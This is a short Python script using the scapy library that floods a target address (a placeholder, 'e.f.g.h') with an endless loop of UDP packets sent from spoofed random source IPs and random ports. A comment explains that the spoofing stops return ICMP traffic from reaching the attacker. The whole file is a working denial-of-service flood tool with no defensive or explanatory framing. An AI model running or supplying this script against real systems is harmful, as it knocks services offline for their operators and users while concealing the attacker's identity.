from scapy.all import *

target_ip="e.f.g.h"
raw=Raw(load="abc") #raw file of size 1KB to be flooded
#ip spoofing required otherwise attacker's system will be flooded with ICMP responses from server
ip=IP(src = RandIP(), dst=target_ip)

while True:
	udp=UDP(sport=RandShort(), dport=RandShort())
	p=ip/udp/raw
	send(p, verbose=0)
